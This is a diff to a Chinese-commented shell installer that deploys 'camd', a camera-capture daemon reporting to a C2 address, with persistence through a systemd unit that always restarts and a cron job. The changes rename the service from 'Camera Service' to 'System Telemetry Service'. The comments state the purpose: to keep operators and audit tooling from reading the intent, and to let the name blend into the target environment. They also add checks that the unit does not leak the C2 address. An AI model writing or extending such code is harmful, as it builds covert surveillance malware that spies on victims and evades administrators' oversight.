@@ -55,8 +55,9 @@ while [ $# -gt 0 ]; do
         --backend) BACKEND="$2"; shift 2 ;;
         --front-host) FRONT_HOST="$2"; shift 2 ;;
         --ca)         CA_SRC="$2"; shift 2 ;;
+        --unit-desc) UNIT_DESC="$2"; shift 2 ;;
         --prefix)     PREFIX="$2"; shift 2 ;;
-        install|uninstall|status|checkpayload) ACTION="$1"; shift ;;
+        install|uninstall|status|checkpayload|renderunit) ACTION="$1"; shift ;;
         *) printf '未知参数: %s\n' "$1"; exit 2 ;;
     esac
 done
@@ -72,6 +73,11 @@ BIN_DST=$PREFIX/usr/local/bin/camd
 UNIT=$PREFIX/etc/systemd/system/camd.service
 CRON=$PREFIX/etc/cron.d/camd
 LOCK=$PREFIX/var/lock/camd.lock
+# 单元描述。默认中性：此前写死 "Camera Service"，直接点明功能。单元文件
+# 是 0644、常进配置管理与审计采集，运维一条 systemctl status 或 cat 就能
+# 读出意图，而该字段对运行毫无作用——纯暴露面。可用 --unit-desc 覆盖为
+# 目标环境里看着眼熟的服务名。
+UNIT_DESC=${UNIT_DESC:-System Telemetry Service}
 # 假根标记：非空即"不碰真实系统状态"。systemd/cron 的**写文件**仍照常
 # （目标是假根内的路径），但 systemctl 子命令一律不执行。
 FAKE_ROOT=0
@@ -334,13 +340,14 @@ install_runner() {
 #!/bin/sh
 # 由 onekey.sh 生成。密钥经环境注入，不出现在命令行（ps 可见）。
 #
-# ROOT_PREFIX 在**生成期**注入，必须与生成时的 PREFIX 一致。此前这里
-# 写死 /etc/camd 与 /usr/local/bin/camd，于是"改了 CONF_DIR 无效"：
-# 假根部署下 run.sh 去读真根 conf（读到另一份配置或读不到），表现为
-# "服务在跑但 C2 地址不对"。
-ROOT_PREFIX='$PREFIX'
+# CONF_ABS / BIN_ABS 在**生成期**注入绝对路径，与 CONF_FILE / BIN_DST 同源。
+# 此前是 ROOT_PREFIX + 硬编码 "/etc/camd/camd.conf"，两处不同源：改了
+# CONF_DIR 变量，run.sh 仍去读旧路径，表现为"改配置无效、服务读另一份
+# conf"。变量与字面量必须只有一个产地，否则改动只生效一半。
+CONF_ABS="$CONF_FILE"
+BIN_ABS="$BIN_DST"
 set -a
-. "\$ROOT_PREFIX/etc/camd/camd.conf"
+. "\$CONF_ABS"
 set +a
 [ -n "\$C2_ADDR" ] || { echo "[FATAL] C2_ADDR 未配置" >&2; exit 6; }
 # "\$@" 透传：systemd 不带参（常驻，Restart=always 兜底重拉）；
@@ -348,7 +355,7 @@ set +a
 # （默认 max_batches=0，跑到收到停止信号为止），每个整点就会新增一个
 # 永不退出的采集进程：进程堆积、多个进程抢同一摄像头、文件句柄与内存
 # 持续增长。驻留机制反而变成资源耗尽与暴露面。cron 路径必须限定批次。
-exec "\$ROOT_PREFIX/usr/local/bin/camd" --sink "\$CAMD_SINK" \$CAMD_EXTRA --backend "\$CAMD_BACKEND" "\$@"
+exec "\$BIN_ABS" --sink "\$CAMD_SINK" \$CAMD_EXTRA --backend "\$CAMD_BACKEND" "\$@"
 RUNEOF
     chmod 0700 "$LIB_DIR/run.sh" 2>/dev/null
     OK "启动器已写入 $LIB_DIR/run.sh（0700）"
@@ -369,7 +376,7 @@ render_unit() {
     mkdir -p "$(dirname "$UNIT")" || return 1
     cat > "$UNIT" <<EOF || return 1
 [Unit]
-Description=Camera Service
+Description=$UNIT_DESC
 After=network.target
 
 [Service]
@@ -667,6 +674,22 @@ case "$ACTION" in
     uninstall) do_uninstall ;;
     status)    do_status ;;
     checkpayload) do_checkpayload ;;
+    renderunit)
+        # 只渲染 + 静态校验单元，不安装、不删除、不碰 systemctl。
+        #
+        # 为什么必须有这个子命令：do_install 里 render_unit 之后，凡判定
+        # "不安装 systemd"（假根或 PID 1 非 systemd）都会 rm -f "$UNIT"。
+        # 于是单元测试在非 systemd 环境**根本无从检查**——而单元内容恰恰
+        # 是最该被静态校验的东西（是否含 Restart=always、是否泄露密钥与
+        # C2 地址、Description 是否点明功能）。
+        #
+        # 用途二：部署前预览。单元是 0644 且常进配置管理，落盘前先看一眼
+        # 比事后清理容易得多。
+        [ -n "$PREFIX" ] || WARN "未指定 --prefix：单元将写入真实 /etc/systemd/system"
+        render_unit || exit 1
+        printf 'UNIT_PATH=%s\n' "$UNIT"
+        [ "$UNIT_ERR" -eq 0 ] || exit 1
+        ;;
 esac
 report
 [ "$fail" -eq 0 ] || exit 1
